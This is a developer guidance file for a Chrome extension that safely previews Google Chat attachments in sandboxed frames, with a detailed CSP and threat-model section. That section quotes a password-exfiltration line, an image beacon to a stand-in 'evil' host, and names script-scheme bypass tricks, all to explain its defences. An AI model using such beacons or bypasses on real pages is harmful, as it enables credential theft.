# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Purpose

A Manifest V3 Chrome extension that previews `.html`, `.md`, `.json`, `.mmd` and `.puml` attachments inline in Google Chat, so recipients no longer have to download the file and open it locally. UI strings are English.

`.txt` is deliberately **not** supported: Google Chat already previews plain text natively, so a second button next to its own preview would be noise.

## Commands

```bash
npm install
npm run build       # typecheck + test + clean + build all five bundles into dist/
npm run build:all   # build only, skips typecheck/test/clean
npm run typecheck   # tsc --noEmit
npm test            # node --test, no test framework dependency
npm run dev         # all five bundles in parallel --watch mode
npm run icons       # regenerate public/icons/*.png from assets/*.svg
npm run clean       # rm -rf dist
```

Tests run on Node's built-in runner against `.ts` sources directly via Node 24 type stripping. Two consequences that are easy to trip over:

- **All relative imports carry an explicit `.ts` extension.** Node's ESM resolver will not guess it.
- **Source must stay within erasable-syntax TypeScript** — no enums, no parameter properties, no namespaces.

Run one file with `node --test src/content/detector.test.ts`. Anything needing a DOM cannot be tested this way, which is why the diagram renderers are injected callbacks rather than imports.

The five suites and what each is guarding:

| File | Guards |
| --- | --- |
| [src/content/detector.test.ts](src/content/detector.test.ts) | Attachment recognition and URL rewriting — the `attachment_token` surviving byte for byte |
| [src/sandbox/document.test.ts](src/sandbox/document.test.ts) | Escaping, asserting on the *absence* of live markup; diagram injection and fallbacks |
| [src/sandbox/markdown.test.ts](src/sandbox/markdown.test.ts) | PlantUML URL encoding — the deflate round-trip, the length ceiling, the hex fallback |
| [src/sandbox/highlight.test.ts](src/sandbox/highlight.test.ts) | That hljs escapes as it tokenises — its output is inserted *unescaped* |
| [src/shared/settings.test.ts](src/shared/settings.test.ts) | `normalise()` rejecting bad stored values, including non-https diagram servers |

Load the extension by pointing `chrome://extensions` → "Load unpacked" at `dist/`. After a rebuild, click the reload icon on the extension card, then hard-reload the Google Chat tab — `npm run dev` rebuilds files but cannot reload the extension itself.

## Build system

Five separate `vite build --mode <background|content|sandbox|options|mermaid>` passes, each emitting a self-contained **IIFE** bundle. This is deliberate and should not be collapsed into one multi-entry build:

- MV3 content scripts declared in the manifest are not loaded as ES modules, so `content.js` must be a single file with no runtime `import`.
- Rollup only emits `iife` for a single input, hence one pass per entry.
- The sandbox page has an opaque origin, where fetching an ES-module script fails — so it also needs a classic script, which means IIFE there too.

Because all bundles are IIFE, `background` is declared without `"type": "module"` in the manifest. Passes share `dist/` with `emptyOutDir: false`; `npm run build` cleans first. `publicDir` is only enabled on the `background` pass so `public/` is copied once.

`mermaid` is the odd one out: it is **not referenced from the manifest at all**. `src/sandbox/mermaid.ts` injects a `<script src="mermaid.js">` into the sandbox page the first time a document needs a diagram. It is the only minified bundle, because at 3.2 MB it dwarfs everything else — thirty times the rest of the extension combined — and a one-line JSON preview must not pay to parse it.

Static files in `public/` (`manifest.json`, `sandbox.html`, `options.html`, `icons/`) are copied verbatim. `sandbox.html` and `options.html` are intentionally *not* Vite HTML entries, so their `<script src="…">` tags must stay plain classic tags and the filenames must match what `vite.config.ts` emits.

Runtime dependencies are `marked`, `mermaid` and `highlight.js`. All three are bundled **only into the sandbox side** — never into `content.js` or `background.js`, which hold the privileged contexts.

`highlight.js` is imported through its `lib/core` + `lib/languages/*` subpaths, not its package root. The root registers all ~190 grammars; the curated list in [src/sandbox/highlight.ts](src/sandbox/highlight.ts) is a tenth of that. Even so it is what took `sandbox.js` from 75 KB to ~305 KB unminified, so it is the file to look at first if that number matters again. It is bundled directly rather than injected on demand like mermaid, because ~230 KB of local parse is not worth a second injected-callback path through `buildDocument` — the mermaid treatment exists for a 3.3 MB bundle, which is an order of magnitude more.

## Architecture

Untrusted content travels a strict one-way path. Never shortcut it.

```text
background.js          content.js                        sandbox.html
(fetch bytes)   ──►    (string only, never rendered)  ──►  (nested iframe, srcdoc)
      chrome.runtime.sendMessage          window.postMessage
```

1. **[src/content/index.ts](src/content/index.ts)** — detects attachments, injects the button, obtains the bytes, hands the string to the sandbox. It is also the only context that can read settings, and the relay for diagram fetches. It must never insert attachment content into the Google Chat DOM (no `innerHTML` on the host page).
2. **[src/background/index.ts](src/background/index.ts)** — the only context with `host_permissions`, so the only one CORS does not apply to. Fetches attachments (tried *first*, see below) and PlantUML diagrams.
3. **[public/sandbox.html](public/sandbox.html)** + **[src/sandbox/sandbox.ts](src/sandbox/sandbox.ts)** — a manifest-declared sandboxed page (opaque origin, no `chrome.*` APIs) that puts the document into a *nested* iframe via `srcdoc`. The nesting is required: the outer page keeps its postMessage listener alive, and the attachment gets its own document so its scripts, when enabled, run in the inner frame's opaque origin.

Shared message contracts live in [src/shared/protocol.ts](src/shared/protocol.ts).

### The five kinds

`AttachmentKind` (`html` | `markdown` | `json` | `mermaid` | `plantuml`) is a **security boundary, not a display preference**. All five end at the same `srcdoc` sink that renders real HTML, so what separates them is who authored the document:

- `html` — the file *is* the document, passed through untouched. **The only kind that can ever get `allow-scripts`.**
- `markdown` — [src/sandbox/document.ts](src/sandbox/document.ts) generates the document; [src/sandbox/markdown.ts](src/sandbox/markdown.ts) renders the source with raw HTML escaped and dangerous link schemes stripped.
- `json` — the document is generated too, by [src/sandbox/json.ts](src/sandbox/json.ts); every key and value is escaped.
- `mermaid`, `plantuml` — a whole `.mmd` or `.puml` file as one diagram. The document is generated, and the source is escaped on every path that shows it: drawing disabled, render failed, or fetch failed.

They stay two diagram kinds rather than one `diagram` kind because their privacy properties differ — mermaid is drawn locally, drawing plantuml sends the source to a server — and the preview has to be able to tell the user which is happening.

Get this wrong and a JSON string containing `<script>` becomes a script. [src/sandbox/document.test.ts](src/sandbox/document.test.ts) asserts on the *absence* of live markup for exactly this reason.

### Which context does the fetching

Both contexts are tried for attachments, **service worker first**, and both call the same [src/shared/fetch-attachment.ts](src/shared/fetch-attachment.ts). Each covers the other's blind spot:

- The **service worker** is the only context that can follow the redirect. `DOWNLOAD_URL` answers with a cross-origin redirect to Google's file-serving hosts; a page-context fetch starts same-origin but becomes cross-origin at the redirect and dies with a bare `TypeError: Failed to fetch`, because those hosts send no `Access-Control-Allow-Origin`. `host_permissions` exempt the worker from CORS — which is also why **every possible redirect target must be listed there**, not just the endpoint host.
- The **content script** is the only context that sends `Origin`/`Referer`. A service worker `fetch` cannot set `Referer` at all (forbidden header), so if the Chat API starts requiring it, this path is the one that still works.

When both fail, **both errors are reported**. An earlier version returned only the page-context error and hid the worker's entirely, which made a CORS failure look like an API rejection and cost a full debugging round.

### postMessage validation

Both sides use `event.source` identity, not `event.origin`. A sandboxed page's origin is the string `"null"`, so origin checks are meaningless and `targetOrigin` must be `'*'`. Do not "fix" these into origin comparisons.

This also rejects the attachment frame, which can post to `window.top` but is never `frame.contentWindow`.

### Extension UI isolation

Both the button and the modal mount into **closed shadow roots** with `:host { all: initial }`. Google Chat's stylesheet is aggressive; without shadow DOM the UI breaks on Google's next release.

## Markdown rendering

`marked` does the parsing. Two non-obvious rules in [src/sandbox/markdown.ts](src/sandbox/markdown.ts):

- Raw HTML is neutralised per-token via the `html` renderer, **not** by escaping the source before parsing. Pre-escaping is the obvious approach and it is wrong: it double-escapes inside code spans and fences, so `` `code <b>` `` renders as `&lt;b&gt;`.
- Link and image hrefs are scheme-filtered with whitespace and control characters stripped first, because `java\tscript:` is a scheme to a browser but not to a naive regex.

### Syntax highlighting

Fenced blocks carrying a language tag are coloured by [src/sandbox/highlight.ts](src/sandbox/highlight.ts). The colouring is baked into the document as `<span>`s at build time, and it has to be: the frame rendering the document is built with `sandbox=""`, so a client-side highlighter injected into it would never run. Same constraint that shapes the JSON tree.

Three things not to undo:

- **hljs output is inserted unescaped.** That is correct — it *is* markup — and it rests entirely on hljs escaping the source as it tokenises. [src/sandbox/highlight.test.ts](src/sandbox/highlight.test.ts) pins that across several grammars, because a regression there puts a live `<script>` from inside a code fence into the document. Note that the escaped brackets are not adjacent to the tag name (`&lt;<span class="hljs-name">script</span>&gt;`), so an assertion on `&lt;script&gt;` will not match.
- **An unknown language is not an error.** `highlight()` returns null and the block stays a plain escaped `<pre><code>` — exactly what shipped before the feature.
- **Auto-detection is deliberately not attempted.** `highlightAuto` guesses wrong often enough on short snippets that mislabelled colouring reads worse than none, so an untagged fence stays plain.

The theme in `HIGHLIGHT_STYLES` is hand-written rather than imported from `highlight.js/styles/*.css`: those themes style `.hljs` itself with their own background and padding, which fights the `pre` rules already in `DOCUMENT_STYLES`, and Vite would have to inline a CSS asset into an IIFE bundle to get it there. Its palette is the one the JSON tree uses, so a `.md` and a `.json` preview agree on what a string looks like. Every selector in it must stay `.hljs-`-prefixed — it is concatenated into the same `<style>` as the rules for `pre`, `table` and the rest, and a stray selector would restyle the document. A test asserts that.

### Diagrams

Diagrams arrive two ways, and both land in the same rendering paths:

- **Fenced blocks inside a Markdown file**, tagged `mermaid` or `plantuml`/`puml`/`uml`. Switched off in settings, they stay ordinary code blocks.
- **A whole `.mmd` or `.puml` attachment**, via the `mermaid` and `plantuml` kinds. Switched off, the file opens showing its source with a note saying why — which for PlantUML is the point: "off" means the source must not leave the machine, and showing it locally honours that while still being useful. That is why `previewMermaid`/`previewPlantUml` (does the file get a button) are separate settings from `mermaidEnabled`/`plantUmlEnabled` (is a diagram drawn).

Do not implement a standalone diagram file by wrapping it in a synthetic fenced block and pushing it through the markdown renderer. A source containing ``` closes the fence early and the rest of the file renders as prose; `document.test.ts` pins this.

The two renderers work in opposite ways and neither choice is arbitrary.

**Mermaid renders locally.** It runs in the *sandbox page* — which has `allow-scripts` because `sandbox.js` lives there — and produces an SVG string. That SVG is then embedded in the generated document, whose frame still has `sandbox=""`. So a mermaid bug that emitted live markup still could not run anything. Nothing touches the network.

**PlantUML cannot render locally.** It is a Java program; the only browser route is a PlantUML server, so **the diagram source leaves the machine**. Two things about how it gets there:

- It is **not** an `<img src="https://server/…">`. The service worker fetches the image and returns a `data:` URI, which the document then displays. That indirection exists because the sandbox CSP's `img-src` is static: a user-configured server could never be allowlisted in it. Fetching through the worker means `img-src` stays at `data: blob:` and previewed content can reach **no** host at all.
- Getting there needs a relay, because the sandbox page has no `chrome.*` APIs: sandbox → content script → service worker → back, with an id per request ([src/sandbox/diagram-relay.ts](src/sandbox/diagram-relay.ts)). Several diagrams in one document resolve concurrently and out of order, which is what the ids are for.
- The URL uses PlantUML's **deflate + custom-base64** form, via `CompressionStream('deflate-raw')`. It used to use the `~h` hex form, on the reasoning that hex needs no compressor and no async encode "at the cost of a longer URL". That cost was never measured and it was not a mere cost: hex doubles the source, and the server answers **HTTP 400 somewhere past an 8 KB URL**, so every `.puml` over roughly 3.5 KB — most real diagrams — failed to render. Measured against the live server: a 4038-byte source is an 8082-character hex URL that 400s, versus a 562-character deflate URL that returns 200. `~h` survives only as the fallback when `CompressionStream` is missing, so an old browser loses large files rather than the whole feature.

`buildDocument` is async and takes `renderMermaid` and `fetchDiagram` as **injected** callbacks rather than importing either path directly. That is what keeps the 3.2 MB mermaid bundle out of documents that do not need it, and what lets `document.test.ts` test the whole path in Node with fakes and no DOM. A diagram that fails falls back to showing its source — one bad diagram must not cost the reader the document.

## The JSON tree has no JavaScript

The frame rendering it is built with `sandbox=""`, so the tree is `<details>`/`<summary>` and nothing else. Do not "improve" it with a click handler — it would silently do nothing.

That constraint shapes the design. Per-node collapsing is free (the browser does it), but **expand-all and collapse-all cannot be**, so they are a full re-render driven from the modal through the `JsonExpand` field on the render message. Array items carry their index as a label, because otherwise a list of similar objects collapses into a column of identical `{ … 3 keys }` rows.

Two limits in [src/sandbox/json.ts](src/sandbox/json.ts) worth knowing before changing them: `AUTO_OPEN_DEPTH` (2) keeps deep files from opening fully, and `MAX_NODES` (20 000) falls back to pretty-printed text — one `<details>` element per value gets slow long before the size cap bites. Invalid JSON is not an error state: the parse message plus the raw file are shown, because seeing *why* it is broken is the point.

## Settings and the options page

[src/shared/settings.ts](src/shared/settings.ts) is the single source of truth; the page is [public/options.html](public/options.html) + [src/options/index.ts](src/options/index.ts), declared via `options_ui`.

- **Defaults reproduce the pre-settings behaviour exactly**, so an install that never opens the page behaves as before. `allowScriptsByDefault: false` is the one to leave alone — a static render cannot capture keystrokes, and that is what makes a fake login form in an attachment useless.
- **Only the content script reads storage.** The sandbox page has no `chrome.*` APIs, so whatever it needs (`DiagramSettings`) travels in the render message. Do not try to read settings from the sandbox.
- **`normalise()` is not decoration.** Storage survives upgrades, syncs from other machines, and can be hand-edited, so every field is type-checked and clamped on the way out. A non-https PlantUML server is rejected rather than passed through — the source of every diagram travels in that URL.
- **A custom PlantUML server needs a host permission**, and Chrome only grants optional permissions from a user gesture. The request therefore happens *inside* the save click, and the save is abandoned if declined; storing a server the extension cannot reach would produce broken diagrams with no explanation. `https://www.plantuml.com/*` is in `host_permissions` so the default works with no prompt.

Layout and behaviour worth preserving:

- **The page is a fixed-height shell**: title bar, then a `232px` nav beside a scrolling `<main>`, then a sticky footer. `<main>` is the scroller, not the window — anything that assumes `window.scrollY` will be wrong here. The nav is hidden under 720px.
- **The sidebar scrollspy is position-based, not an `IntersectionObserver`.** The sections differ a lot in height and the last one is short enough that it would never cross an observer band, leaving the nav stuck on the previous entry. Reading `scrollTop` lets the bottom-of-scroller case be handled explicitly, which is what selects the final section.
- Yellow (`--accent`, the HBLAB colour from the icon) is reserved for **state** — the active nav item, enabled toggles — and never carries text, because it fails contrast on white.

## Detection is the fragile part

[src/content/detector.ts](src/content/detector.ts) is the file that will break when Google ships a Chat update. Everything version-fragile is confined to the constants at the top.

**Chat has more than one card layout, and they share nothing.** The one below has an `<img>` whose `alt` is the file name. The detailed-thread card has **no `<img>` at all** — its thumbnail is a `<span>` with a `background-image` pointing at `drive-thirdparty.googleusercontent.com` — and its download `<a>` carries no label beyond an "Open in new tab" button. There the file name exists only on an ancestor `div[role="button"]`'s `title`/`aria-label`, which is why `findHtmlAttachments` walks up `ANCESTOR_LABEL_DEPTH` levels collecting both. Dropping that walk makes the whole detailed-thread view undetectable, silently — the endpoint URL on that card has no `content_type` parameter to fall back on either.

Because both an `<img>` and an `<a>` can point at the same attachment, buttons are deduplicated per scan on `attachment_token` — the only stable identity, since the two elements reach the same file through visibly different URLs.

The label itself needs care: Chat's `aria-label` is `", <name>."`, and the trailing period is enough to make a naive `\.puml$` fail. `EXTENSION_END` is what allows it.

An attachment renders as a **thumbnail card, not a link** — this was confirmed against live Chat markup:

```html
<div class="nmzsyc r1jLeb">                     <!-- obfuscated, never match on this -->
  <img class="INRavc hL6y0b"
       alt="hblab-slide-profile.html"            <!-- file name -->
       src="https://chat.google.com/api/get_attachment_url
            ?url_type=THUMBNAIL_URL
            &content_type=text%2Fhtml            <!-- MIME type -->
            &attachment_token=AOo0EEV5...&sz=w512">
</div>
```

So the URL is self-describing and is the only thing worth matching on:

- **Never key off CSS class names.** They are build-generated and change between releases. Detection matches the `get_attachment_url` endpoint, then reads `content_type` and the `alt`/`aria-label`/`download` label.
- **The file extension decides the kind; `content_type` is only a fallback.** Chat reports `.md` as `text/plain` and frequently reports `.html` as `application/octet-stream`, so trusting the MIME type would render Markdown as raw text and skip HTML files entirely. For `.mmd`/`.puml` there is no fallback at all — Chat serves every diagram extension as `text/plain`, so a missing entry in the extension table means the file is simply not detected. Note `.mmd` sits one character from the `.md` pattern, which is checked first; a test pins that they do not collide.
- **The same endpoint serves the bytes**, selected by `url_type` — see [src/shared/attachment-url.ts](src/shared/attachment-url.ts). All rewriting is string surgery, *not* `URLSearchParams`: round-tripping through the URL parser re-encodes the opaque `attachment_token` and Chat rejects the result. [src/content/detector.test.ts](src/content/detector.test.ts) pins this byte for byte.
- **The endpoint matcher must stay host- and path-agnostic.** Chat serves it from at least `chat.google.com/api/…`, `chat.google.com/u/0/api/…` (multi-account), and `mail.google.com/chat/api/…` (embedded in Gmail). Pinning it to one host made the URL go unrecognised, be fetched unrewritten as a thumbnail, and return HTTP 400 — with a misleading error, because a wrong endpoint and a wrong `url_type` both surface as 400.
- **The accepted parameter combination is undocumented.** `downloadUrlCandidates` returns an ordered list — varying `url_type` across `DOWNLOAD_URL`/`FIFE_URL`/`MEDIA_URL` and whether `allow_caching` is carried over — and the fetcher tries each until one returns non-image bytes. In practice `DOWNLOAD_URL` through the service worker is the one that works; the others are kept as fallbacks. Every failed attempt is reported with its `url_type` *and* host/path; do not swallow or shorten that, it is the only diagnostic available. It deliberately excludes the query string, which carries the session-bearing `attachment_token`.
- The message list is **virtualized** — Chat mounts and unmounts messages while scrolling, so a one-shot scan at load time misses nearly everything. `observeHtmlAttachments` runs a debounced `MutationObserver` over `document.body`; processed elements are tagged with `data-gchat-html-preview` to stay idempotent.

**Verification status.** HTML previews are confirmed working end to end against a live Google Workspace account. The Markdown, JSON and diagram paths — including standalone `.mmd`/`.puml` files — have been rendered through `buildDocument` in headless Chrome, but not yet opened from a live Chat attachment.

## Icons

`assets/*.svg` are the masters; `public/icons/*.png` are generated by `npm run icons` (needs `rsvg-convert` — `brew install librsvg`) and committed. Edit the SVG, never the PNGs.

There are **two** masters on purpose. `icon.svg` renders 48 and 128; `icon-small.svg` renders 16 and 32 with thicker strokes, wider gaps and less padding, because downscaling the full-detail mark turned the chevrons to mush and closed the gaps around the slab. Keep them visually in sync — same colours, same 11° lean.

The mark is HBLAB's yellow slab inside `< >`. The lean is the point: HBLAB's identity is that the *entire* wordmark is italic at ~11°, so the whole icon sits in one `skewX(-11)`, which makes the slab a parallelogram for free. Brand colours are `#FFC61E` and `#414042`.

## Security posture

Previewed files come from arbitrary coworkers and are treated as hostile. The threat model has two distinct halves; do not conflate them.

**Session theft — structurally impossible.** Neither the sandbox page nor the attachment frame has `allow-same-origin`, so both sit in opaque origins. The attachment cannot read Google cookies, reach the Chat DOM, call `chrome.*`, or see `window.parent`. It never enters the Chat page as markup — the content script only ever passes it as a string.

**Phishing and exfiltration — mitigated by two rules that must hold together.**

1. **No network egress.** The sandbox CSP is `default-src 'none'` with narrow allowances: `img-src`/`media-src` are `data: blob:` only, `font-src data:`, `style-src 'unsafe-inline'` with no host, `script-src` with no host, `connect-src 'none'`, `form-action 'none'`, `frame-src 'self' data: blob:`. The sandbox flag list is `allow-scripts` alone — no `allow-popups`, `allow-modals`, `allow-forms`, or top navigation. Together these close fetch/XHR/WebSocket/beacon, image beacons, remote CSS and fonts, form POSTs, `window.open`, and frame or self navigation to a remote URL.
2. **Scripts are off by default.** The attachment frame is built with `sandbox=""` — every restriction on — and only gets `allow-scripts` when the user clicks *Enable scripts* on that preview, or turns on `allowScriptsByDefault`. A static render cannot capture keystrokes, which is what makes a fake login form in an attachment useless. For `markdown` and `json` the toggle does not exist at all, and `sandbox.ts` re-checks the kind rather than trusting the message.

Rule 1 was the fix for a real hole: with `img-src *`, an attachment could keylog a fake Google login form and exfiltrate via `new Image().src = 'https://evil/?' + password`, since `form-action 'none'` blocks submission but not that.

PlantUML looks like it should be an exception to rule 1, and an earlier version made it one by allowlisting `https://www.plantuml.com` in `img-src`. It no longer is: the service worker fetches the diagram and the document displays a `data:` URI, so no host is reachable from previewed content. Resist re-adding a host to `img-src` — it would hand every previewed file a beacon channel to buy a feature that already works without one.

The frame is rebuilt from scratch on each render in [src/sandbox/sandbox.ts](src/sandbox/sandbox.ts). The `sandbox` attribute is only read at load time, so mutating a live frame would silently keep the old permissions.

**Known residual risks**, all low-bandwidth and none reaching the user's account: DNS-prefetch-style hostname leaks, WebRTC if Chrome's `webrtc` CSP directive is absent, timing/existence signals from the user opening the file, and resource exhaustion (an attachment can hang its own frame). Remote images, remote fonts, and CDN scripts do not render — that is the accepted cost of rule 1. PlantUML source reaching a third-party server is a disclosure the user opts into, per the settings.

Any change to these CSP directives or sandbox flags changes the threat model. Say so explicitly rather than adjusting them in passing.
